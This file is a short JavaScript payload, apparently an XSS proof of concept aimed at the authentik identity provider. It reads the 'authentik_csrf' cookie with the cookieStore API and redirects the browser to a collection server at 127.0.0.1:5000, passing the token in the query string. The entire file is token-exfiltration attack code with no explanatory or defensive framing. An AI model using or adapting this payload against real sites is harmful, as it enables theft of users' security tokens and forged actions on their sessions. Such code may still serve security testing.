(async function() {
    if ('cookieStore' in window) {
        try {
            const csrfCookie = await cookieStore.get('authentik_csrf');
            const token = csrfCookie ? csrfCookie.value : null;

            if (token) {
                window.location.href = `http://127.0.0.1:5000/token?token=${encodeURIComponent(token)}`;
            } else {
                console.error('CSRF token not found.');
            }
        } catch (err) {
            console.error('Error fetching the CSRF token:', err);
        }
    } else {
        console.error('cookieStore API is not supported in this browser.');
    }
})();